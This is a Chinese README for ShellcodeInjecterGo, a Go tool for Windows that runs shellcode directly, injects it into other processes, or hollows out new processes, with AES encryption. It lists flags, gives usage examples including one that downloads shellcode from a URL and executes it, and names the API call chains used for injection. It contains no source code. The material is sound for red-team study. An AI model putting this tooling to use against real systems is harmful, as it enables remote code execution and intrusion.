# ShellcodeInjecterGo

这是一个用Go语言编写的Windows shellcode执行工具。支持多种shellcode注入方式，包括直接执行、进程注入和进程镂空，并集成了高级的AES加密保护机制。

## 功能特性

- 支持多种shellcode输入方式
    - 直接输入字节 (-i)
    - 从文件读取 (-f)
    - 从URL下载 (-u)
- 支持多种执行方式
    - 直接在当前进程中执行
    - 通过PID注入到指定进程 (-p)
    - 通过进程名注入到指定进程 (-n)
    - 创建并镂空新进程 (-e)
- 安全特性
    - AES-256加密保护
    - 随机IV生成
    - PKCS7填充
- 详细的错误处理和调试信息
- 支持Windows系统

## 系统要求

- Windows操作系统
- Go 1.16或更高版本
- golang.org/x/sys/windows包

## 安装

```bash
# 克隆仓库
git clone https://github.com/Gr-1m/ShellcodeInjecterGo.git

# 进入项目目录
cd ShellcodeInjecterGo

# 构建项目
go build -o ShellcodeInjecterGo.exe
```

## 使用方法

### 命令行参数

```
-i string    直接指定shellcode字节
-f string    从文件加载shellcode
-u string    从URL下载shellcode
-p int       指定注入的目标进程ID（可选）
-n string    指定注入的目标进程名称（可选）
-e string    指定要镂空的可执行文件路径（可选）
-debug       启用调试输出
```

### 使用示例

1. 从URL加载shellcode并直接执行：
```bash
ShellcodeInjecterGo.exe -u http://example.com/shellcode.bin -debug
```

2. 通过进程ID注入shellcode：
```bash
ShellcodeInjecterGo.exe -f shellcode.bin -p 1234
```

3. 通过进程名称注入shellcode：
```bash
ShellcodeInjecterGo.exe -f shellcode.bin -n "notepad.exe"
```

4. 进程镂空执行：
```bash
ShellcodeInjecterGo.exe -f shellcode.bin -e "C:\Windows\notepad.exe"
```

## 技术实现细节

### 加密保护机制
- AES-256 CBC模式加密
- 随机密钥和IV生成
- PKCS7填充标准
- 内存安全处理

### 进程操作
1. 直接执行模式
    - VirtualAlloc
    - RtlMoveMemory
    - CreateThread
    - WaitForSingleObject

2. 进程注入模式
    - OpenProcess
    - VirtualAllocEx
    - WriteProcessMemory
    - CreateRemoteThread

3. 进程镂空模式
    - CreateProcessA（挂起方式）
    - ZwQueryInformationProcess
    - ReadProcessMemory
    - WriteProcessMemory
    - ResumeThread

### 进程查找
- CreateToolhelp32Snapshot
- Process32First/Process32Next
- UTF16字符串处理

## 错误处理

常见错误及解决方案：

1. Access Denied
    - 使用管理员权限运行
    - 检查进程权限
    - 确认目标进程访问权限

2. 内存操作错误
    - 检查系统资源
    - 验证shellcode大小
    - 确认内存分配权限

3. 进程操作错误
    - 确认目标进程存在
    - 验证进程名称/ID正确性
    - 检查进程状态

4. 加密相关错误
    - 验证密钥完整性
    - 检查数据块大小
    - 确认填充正确性

## 安全警告

⚠️ 本工具具有潜在的危险性，可能被滥用：
- 仅可用于授权的安全测试
- 不得用于未经授权的系统
- 不得用于恶意目的
- 使用加密功能时注意密钥管理

## 贡献指南

欢迎提交Pull Request或Issue来改进本项目：
1. Fork本仓库
2. 创建您的特性分支
3. 提交您的改动
4. 推送到您的分支
5. 提交Pull Request

## 免责声明

本工具仅供安全研究和教育目的使用。使用本工具进行任何未经授权的测试或攻击行为，后果由使用者自行承担。作者不对任何滥用或非法使用负责。

## 致谢

- [ChrisPritchard/golang-shellcode-runner](https://github.com/ChrisPritchard/golang-shellcode-runner)
- [sharcmz/ShellcodeInjecterGo](https://github.com/sharcmz/ShellcodeInjecterGo)
- Windows系统编程文档
- Go语言社区
